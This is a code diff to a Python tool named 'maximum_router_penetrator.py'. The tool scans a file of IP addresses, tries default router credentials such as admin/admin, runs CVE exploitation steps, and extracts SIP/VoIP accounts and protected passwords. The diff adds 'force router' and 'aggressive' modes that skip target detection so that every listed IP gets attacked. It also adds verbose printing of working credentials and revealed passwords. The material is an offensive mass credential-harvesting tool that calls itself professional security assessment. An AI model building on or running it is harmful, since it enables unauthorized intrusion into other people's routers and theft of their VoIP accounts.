@@ -76,6 +76,10 @@ class MaximumRouterPenetrator:
     def __init__(self):
         self.version = "18.0 Ultimate Professional"
         
+        # Mode settings
+        self.force_router_mode = False
+        self.aggressive_mode = False
+        
         # Your priority credentials (VERIFIED testing)
         self.priority_credentials = [
             ('admin', 'admin'),
@@ -642,13 +646,44 @@ class MaximumRouterPenetrator:
                     penetration_results['total_sip_accounts'] += sip_count
                     
                     print(f"      🎉 VERIFIED SIP SUCCESS: {sip_count} accounts")
+                    
+                    if verbose:
+                        # Show detailed SIP success info
+                        brand = penetration_result.get('router_info', {}).get('brand', 'unknown')
+                        method = penetration_result.get('access_method', 'unknown')
+                        print(f"         🏷️ Router: {brand.upper()}")
+                        print(f"         🔑 Method: {method}")
+                        
+                        if penetration_result.get('protected_passwords_revealed', 0) > 0:
+                            print(f"         🔐 Protected passwords revealed: {penetration_result['protected_passwords_revealed']}")
+                        
+                        if penetration_result.get('authenticated_sip_extraction'):
+                            print(f"         💎 Deep SIP extraction successful")
                 
                 elif penetration_result.get('verified_access'):
                     print(f"      ✅ VERIFIED ACCESS: No SIP found")
+                    
+                    if verbose:
+                        # Show access details
+                        brand = penetration_result.get('router_info', {}).get('brand', 'unknown')
+                        creds = penetration_result.get('credentials', 'unknown')
+                        if isinstance(creds, tuple):
+                            creds = f"{creds[0]}:{creds[1]}"
+                        print(f"         🏷️ Router: {brand.upper()}")
+                        print(f"         🔑 Working credential: {creds}")
                 
                 else:
                     status = penetration_result.get('status', 'unknown')
                     print(f"      {self._get_status_emoji(status)} {status.upper()}")
+                    
+                    if verbose and status == 'not_router':
+                        # Show why detection failed
+                        router_info = penetration_result.get('router_info', {})
+                        score = router_info.get('detection_score', 0)
+                        print(f"         📊 Detection score: {score}/100 (threshold: 5)")
+                        details = router_info.get('detection_details', [])
+                        if details:
+                            print(f"         🔍 Detection details: {'; '.join(details[:2])}")
                 
                 # Small delay
                 time.sleep(0.05)
@@ -683,14 +718,30 @@ class MaximumRouterPenetrator:
         
         result['reachable'] = True
         
-        # Step 2: Router identification
-        router_info = self._identify_target_router(target_ip, verbose)
-        if router_info['is_router']:
+        # Step 2: Router identification (or force mode)
+        if self.force_router_mode or self.aggressive_mode:
+            if verbose:
+                print(f"         🚀 FORCE MODE: Treating {target_ip} as router")
+            
+            router_info = {
+                'is_router': True,
+                'brand': 'forced_router',
+                'has_web_interface': True,
+                'login_required': True,
+                'detection_score': 100,
+                'detection_details': ['Forced router mode enabled']
+            }
             result['router_identified'] = True
             result['router_info'] = router_info
+            result['forced_mode'] = True
         else:
-            result['status'] = 'not_router'
-            return result
+            router_info = self._identify_target_router(target_ip, verbose)
+            if router_info['is_router']:
+                result['router_identified'] = True
+                result['router_info'] = router_info
+            else:
+                result['status'] = 'not_router'
+                return result
         
         # Step 3: CVE exploitation attempts
         if verbose:
@@ -2106,6 +2157,18 @@ TECHNIQUES INCLUDED:
   python maximum_router_penetrator.py --password "094F471A1A0A"
 
 🎯 DESIGNED FOR MAXIMUM SUCCESS IN PROFESSIONAL NETWORK SECURITY ASSESSMENT
+
+USAGE EXAMPLES:
+  python3 maximum_router_penetrator.py --file ips.txt -v
+  python3 maximum_router_penetrator.py --file ips.txt --force-router -v
+  python3 maximum_router_penetrator.py --file ips.txt --aggressive -v -r report.txt
+  python3 maximum_router_penetrator.py -p "094F471A1A0A"
+
+MODES:
+  --force-router    Force treat all IPs as routers (skip detection)
+  --aggressive      Test all IPs regardless of router detection
+  -v, --verbose     Show detailed live debugging of every step
+
         """
     )
     
@@ -2114,11 +2177,17 @@ TECHNIQUES INCLUDED:
     parser.add_argument('-p', '--password', help='Decrypt Cisco Type 7 password')
     parser.add_argument('-r', '--report', help='Generate maximum penetration report')
     parser.add_argument('-v', '--verbose', action='store_true', help='Verbose maximum penetration output')
+    parser.add_argument('--force-router', action='store_true', help='Force treat all IPs as routers (skip detection)')
+    parser.add_argument('--aggressive', action='store_true', help='Aggressive mode - test all IPs regardless of detection')
     parser.add_argument('--json', action='store_true', help='JSON output format')
     
     args = parser.parse_args()
     
     penetrator = MaximumRouterPenetrator()
+    
+    # Set modes
+    penetrator.force_router_mode = getattr(args, 'force_router', False)
+    penetrator.aggressive_mode = getattr(args, 'aggressive', False)
     
     # Password decryption
     if args.password:
